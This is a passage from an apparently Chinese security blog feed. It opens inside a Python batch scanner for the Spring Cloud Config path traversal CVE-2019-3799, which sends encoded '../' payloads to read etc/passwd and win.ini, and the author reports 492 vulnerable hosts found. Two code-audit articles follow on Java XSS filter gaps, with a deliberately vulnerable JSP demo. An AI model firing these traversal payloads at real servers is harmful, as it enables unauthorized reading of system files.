class="string">'etc%252Fpasswd'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'Windows%252Fwin.ini'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">3</span> + <span class="string">'etc%252Fpasswd?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">7</span> + <span class="string">'Windows%252Fwin.ini?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'etc%252Fpasswd?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'Windows%252Fwin.ini?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"><span class="keyword">return</span> pocs</span><br><span class="line"></span><br><span class="line">pocs = init_poc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> pocs:</span><br><span class="line">        url = url <span class="keyword">if</span> <span class="keyword">not</span> url.endswith(<span class="string">'/'</span>) <span class="keyword">else</span> url[<span class="number">0</span>:len(url)<span class="number">-1</span>] <span class="comment">#去掉结尾/</span></span><br><span class="line">        target_url = url + p.get(<span class="string">'payload'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(target_url,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (r.status_code == <span class="number">200</span>) <span class="keyword">and</span> (p.get(<span class="string">'keyword'</span>) <span class="keyword">in</span> r.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>去参加Avicii的纪念活动之前就挂着扫描，回来发现成果还不错。扫描5815个资产，存在漏洞的有492。最后希望管理员们及时修复吧！</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/batch_scan_result.png" alt="扫描成果"></p><h2 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h2><ul><li><a href="https://github.com/mpgn/CVE-2019-3799" target="_blank" rel="noopener">https://github.com/mpgn/CVE-2019-3799</a></li><li><a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">https://pivotal.io/security/cve-2019-3799</a></li><li><a href="https://mp.weixin.qq.com/s/roXk5ykq3Jqd4izEOrQ5qw" target="_blank" rel="noopener">Spring Cloud Config Server 路径穿越与任意文件读取漏洞分析 - 【CVE-2019-3799】</a></li><li><a href="https://mp.weixin.qq.com/s/yj0cWEsyiPJr4A7YXpmLJw" target="_blank" rel="noopener">Spring Cloud Config Server 任意文件读取漏洞</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Spring Cloud Config Server路径穿越漏洞（CVE-2019-3799）的分析文章已经很多了，这里我不在画蛇填足。在分析该漏洞之后，发现了一些小细节，感觉对该漏洞检测还是挺有帮助的。基于发现的这些细节，我们来构造适应各种场景，甚至各种奇葩场景的批量检测脚本！&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>过滤器作用范围/和/*引发的安全问题</title>
    <link href="http://gv7.me/articles/2019/security-raised-by-java-filter-scope-missetting/"/>
    <id>http://gv7.me/articles/2019/security-raised-by-java-filter-scope-missetting/</id>
    <published>2019-04-04T19:10:20.000Z</published>
    <updated>2019-04-04T20:41:08.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>问题：过滤器作用范围设置为/或/*一样么？</strong></p><p>安全人员可能觉得不一样，毕竟从对通配符的认识来说，<code>/</code>代表的只是根目录，<code>/*</code>代表所有。</p><p>开发人员可能觉得一样，根据平常的开发经验，并未发现两者的差别。</p><p>其实呢，这两种认识都不正确，更确切地说前者说的不够正确。具体许我慢慢道来。</p><h2 id="0x01-问题背景"><a href="#0x01-问题背景" class="headerlink" title="0x01 问题背景"></a>0x01 问题背景</h2><p>回想起之前做的代码审计时，发现项目设置全局过滤器时，有的设置为<code>/</code>，有的设置为<code>/*</code>。<br>在自己模糊印象里，在校学jsp时确实感觉两者是一样的。但作为安全人员，还是不禁好奇，于是查资料写代码实验，终于发现他们的不同。在我明白了它们的不同之后，我调查了下周边做安全和开发的朋友，结果清一色的认为它们一样。</p><h2 id="0x02-实验测试"><a href="#0x02-实验测试" class="headerlink" title="0x02 实验测试"></a>0x02 实验测试</h2><p>我们以防御XSS漏洞的demo来实验，过滤器使用上篇文章的代码。</p><p><strong>存在XSS漏洞的jsp页面代码</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(request.getParameter(<span class="string">"str"</span>));%&gt;</span><br></pre></td></tr></table></figure><p><strong>web.xml中过滤器配置</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;url-pattern&gt;/*&lt;/url-pattern&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/security-raised-by-java-filter-scope-missetting/show.gif" alt="演示"></p><p>通过演示的结果我们知道：</p><ol><li><code>/*</code>才是真正意义上的过滤所有请求</li><li><code>/</code>并非真正意义上的过滤所有请求，它过滤除jsp页面之外的请求</li></ol><h2 id="0x03-最后总结"><a href="#0x03-最后总结" class="headerlink" title="0x03 最后总结"></a>0x03 最后总结</h2><p>一般项目采用MVC架构之后，基本不会有程序猿继续在jsp文件写后端处理代码。然而这个世界很奇怪，正如墨菲定律说的那样，觉得不可能的往往会发生。而我们更不能把安全寄托于人性上，所以全局安全过滤器请设置作用范围为<code>/*</code>。</p><p>当我们在进行代码审计发现全局过滤器的作用范围为<code>/</code>,则可以着重检查jsp文件中是否包含后端处理代码，毕竟其不在过滤器保护范围内。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;问题：过滤器作用范围设置为/或/*一样么？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安全人员可能觉得不一样，毕竟从对通配符的认识来说，&lt;code&gt;/&lt;/code&gt;代表的只是根目录，&lt;code&gt;/*&lt;/code&gt;代表所有。&lt;/p&gt;
&lt;p&gt;开发人员可能觉得一样，根据平常
      
    
    </summary>
    
      <category term="代码审计" scheme="http://gv7.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>上传包可“绕过”Java过滤器的检查？</title>
    <link href="http://gv7.me/articles/2019/why-can-multipart-post-bypass-java-filter/"/>
    <id>http://gv7.me/articles/2019/why-can-multipart-post-bypass-java-filter/</id>
    <published>2019-03-26T19:49:45.000Z</published>
    <updated>2019-03-28T14:26:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>月初和southwind0师傅做代码审计时，发现了一个比较奇葩的问题。系统设置了全局的XSS过滤器，在其他功能点上生效了，但在一个公告发布功能没有被过滤。southwind0师傅通过对比数据包发现公告发布数据包是上传包（也就是我们常见的上传POST请求）。后来我经过编写测试代码，发现过滤器确实无法过滤上传数据包的参数值。</p><p>这让我不禁思考 *”上传包可绕过Java过滤器?”*，如果是真的，那么问题很严重呀，以后过滤器岂不是都可以这样绕过，那这样全局XSS，SQL注入防御过滤器岂不是形同虚设？查了下网上大多数提供XSS过滤器代码基本都存在这个问题，我意识到问题的严重性，打算深入Tomcat和Spring MVC的底层代码一探究竟。</p><h2 id="0x02-测试代码"><a href="#0x02-测试代码" class="headerlink" title="0x02 测试代码"></a>0x02 测试代码</h2><p>由于审计的代码属于敏感信息，我编写了一个和审计场景几乎一样的测试Demo用于本文的研究。测试Demo有get，post和upload页面用于测试Java过滤器对三种类型请求数据包的过滤情况。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/testdemo.png" alt="测试Demo"></p><h4 id="2-1-后端处理代码"><a href="#2-1-后端处理代码" class="headerlink" title="2.1 后端处理代码"></a>2.1 后端处理代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"get"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doGet</span><span class="params">(Model model, String str,String bbb)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"post"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"post"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"post"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doPost</span><span class="params">(Model model,String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"post"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"upload"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"upload"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"upload"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doUpload</span><span class="params">(Model model,String str)</span> </span>&#123;<span class="comment">/*@RequestParam("str") */</span></span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"upload"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-过滤wrapper代码"><a href="#2-2-过滤wrapper代码" class="headerlink" title="2.2 过滤wrapper代码"></a>2.2 过滤wrapper代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XssHttpServletRequestWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XssHttpServletRequestWrapper</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String parameter) &#123;</span><br><span class="line">        String[] values = <span class="keyword">super</span>.getParameterValues(parameter);</span><br><span class="line">        <span class="keyword">if</span> (values==<span class="keyword">null</span>)  &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> count = values.length;</span><br><span class="line">        String[] encodedValues = <span class="keyword">new</span> String[count];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            encodedValues[i] = cleanXSS(values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encodedValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getParameter</span><span class="params">(String parameter)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String value = <span class="keyword">super</span>.getParameter(parameter);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHeader</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        String value = <span class="keyword">super</span>.getHeader(name);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">cleanXSS</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        value = value.replaceAll(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>).replaceAll(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line"><span class="comment">//        value = value.replaceAll("\\(", "&amp;#40;").replaceAll("\\)", "&amp;#41;");</span></span><br><span class="line">        value = value.replaceAll(<span class="string">"eval\\((.*)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"alert\\((.*?)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"confirm\\((.*?)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']"</span>, <span class="string">"\"\""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"(?i)script"</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-全局过滤器设置"><a href="#2-3-全局过滤器设置" class="headerlink" title="2.3 全局过滤器设置"></a>2.3 全局过滤器设置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>想获取完整代码，请到公众号后台回复”上传包绕Java过滤器测试代码”</p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><p>为了方便描述，我这里将请求分文三种，GET型请求，普通POST型请求和上传POST型请求。本文的普通型POST请求指的是除上传POST型请求之外的POST请求，而上传POST型请求就是我们上传包对应的请求。</p><h4 id="3-1-Spring-MVC如何获取到HTTP请求参数值？"><a href="#3-1-Spring-MVC如何获取到HTTP请求参数值？" class="headerlink" title="3.1 Spring MVC如何获取到HTTP请求参数值？"></a>3.1 Spring MVC如何获取到HTTP请求参数值？</h4><p>为了更透彻的理解出现该问题的原因，我们需要搞清楚Spring MVC框架是如何获取到前端传来的HTTP请求的参数值。</p><p>前端提交的请求会先到达Tomcat服务器，其解析请求参数主要在<code>Request.parseParameters()</code>中进行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.Request</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.parametersParsed = <span class="keyword">true</span>;</span><br><span class="line">Parameters parameters = <span class="keyword">this</span>.coyoteRequest.getParameters();</span><br><span class="line"><span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">parameters.setLimit(<span class="keyword">this</span>.getConnector().getMaxParameterCount());</span><br><span class="line">...</span><br><span class="line">parameters.handleQueryParameters();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.usingInputStream || <span class="keyword">this</span>.usingReader) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.getConnector().isParseBodyMethod(<span class="keyword">this</span>.getMethod())) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 获取请求包ContentType头</span></span><br><span class="line">String contentType = <span class="keyword">this</span>.getContentType();</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 如果请求ContentType为multipart/form-data，也就是上传POST</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"multipart/form-data"</span>.equals(contentType)) &#123;</span><br><span class="line"><span class="comment">//对上传包进行解析</span></span><br><span class="line"><span class="keyword">this</span>.parseParts();</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">"application/x-www-form-urlencoded"</span>.equals(contentType)) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">this</span>.getContentLength();</span><br><span class="line">...</span><br><span class="line">parameters.processParameters(formData, <span class="number">0</span>, len);</span><br><span class="line">...</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tomcat会根据<code>ContentType</code>是否为<code>multipart/form-data</code>判断是否问上传POST型请求，若是则会调用<br><code>parseParts()</code>来解析，我们继续跟进。由于<code>allowCasualMultipartParsing</code>配置项默认为<code>false</code>,<code>parseParts()</code>直接就返回了,也就是说Tomcat默认不会解析上传POST请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseParts</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.parts == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.partsParseException == <span class="keyword">null</span>) &#123;</span><br><span class="line">            MultipartConfigElement mce = <span class="keyword">this</span>.getWrapper().getMultipartConfigElement();</span><br><span class="line">            <span class="keyword">if</span> (mce == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Tomcat7.0+ 已经内置了multipart支持，但是必须显示激活,默认关闭。在全局tomcat配置文件context.xml,或者为war的本地context.xml添加&lt;Context allowCasualMultipartParsing="true"&gt;开启。</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.getContext().getAllowCasualMultipartParsing()) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.parts = Collections.emptyList();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对针对GET行请求和普通POST，Tomcat会调用<code>parameters.processParameters()</code>方法来解析。我们简单看下它的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span 